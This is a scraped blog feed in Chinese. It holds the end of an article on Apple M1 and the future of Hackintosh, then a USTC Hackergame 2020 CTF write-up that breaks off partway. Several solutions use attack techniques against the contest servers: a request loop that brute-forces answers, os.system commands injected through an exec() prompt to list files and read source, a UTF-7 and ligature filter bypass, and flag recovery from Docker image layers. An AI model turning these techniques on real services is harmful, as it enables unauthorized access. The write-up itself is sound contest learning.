上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12' Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div>谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-11</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/1.png\" width=\"508\" height=\"417\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/2.png\" width=\"794\" height=\"327\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/25.png\" width=\"636\" height=\"277\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/3.png\" width=\"482\" height=\"393\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.<span class=\"hljs-title function_\">split</span>(<span class=\"hljs-string\">'，'</span>).<span class=\"hljs-property\">length</span><span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">FormData</span>();    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q1'</span>, i);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q4'</span>, j);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.<span class=\"hljs-title function_\">text</span>()).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.<span class=\"hljs-title function_\">includes</span>(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/4.png\" width=\"680\" height=\"888\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/5.png\" width=\"1862\" height=\"712\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-title class_\">HTMLActuator</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">message</span> = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) {  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).<span class=\"hljs-title function_\">toLowerCase</span>();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">XMLHttpRequest</span>();  request.<span class=\"hljs-title function_\">open</span>(<span class=\"hljs-string\">'GET'</span>, url);  request.<span class=\"hljs-property\">responseType</span> = <span class=\"hljs-string\">'text'</span>;  request.<span class=\"hljs-property\">onload</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) {    <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">\"game-message-extra\"</span>).<span class=\"hljs-property\">innerHTML</span> = request.<span class=\"hljs-property\">response</span>;  };  request.<span class=\"hljs-title function_\">send</span>();  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">messageContainer</span>.<span class=\"hljs-property\">classList</span>.<span class=\"hljs-title function_\">add</span>(type);  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">messageContainer</span>.<span class=\"hljs-title function_\">getElementsByTagName</span>(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].<span class=\"hljs-property\">textContent</span> = message;  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">clearContainer</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sharingContainer</span>);  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sharingContainer</span>.<span class=\"hljs-title function_\">appendChild</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">scoreTweetButton</span>());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>...... <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>......</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/21.png\" width=\"1423\" height=\"781\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/22.png\" width=\"800\" height=\"440\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/23.png\" width=\"800\" height=\"440\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/24.png\" width=\"1067\" height=\"586\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> <span class=\"hljs-variable constant_\">XLSX</span> = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">NzhCN</span> = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = <span class=\"hljs-variable constant_\">XLSX</span>.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = <span class=\"hljs-variable constant_\">XLSX</span>.<span class=\"hljs-property\">utils</span>.<span class=\"hljs-title function_\">sheet_to_json</span>(xlsx.<span class=\"hljs-property\">Sheets</span>[xlsx.<span class=\"hljs-property\">SheetNames</span>[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.<span class=\"hljs-title function_\">forEach</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].<span class=\"hljs-title function_\">forEach</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).<span class=\"hljs-title function_\">split</span>(i);    <span class=\"hljs-keyword\">if</span> (tmp.<span class=\"hljs-property\">length</span> === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = <span class=\"hljs-title class_\">NzhCN</span>.<span class=\"hljs-title function_\">decodeB</span>(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.<span class=\"hljs-property\">yuan</span> * <span class=\"hljs-number\">100</span> + moneyData.<span class=\"hljs-property\">jiao</span> * <span class=\"hljs-number\">10</span> + moneyData.<span class=\"hljs-property\">fen</span>;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count/<span class=\"hljs-number\">100</span>).toFixed(<span class=\"hljs-number\">2</span>)}</span>}`</span>); <span class=\"hljs-comment\">// 直接打印 flag</span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>......</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/26.png\" width=\"919\" height=\"936\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>......</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>......</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cat</span> gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span 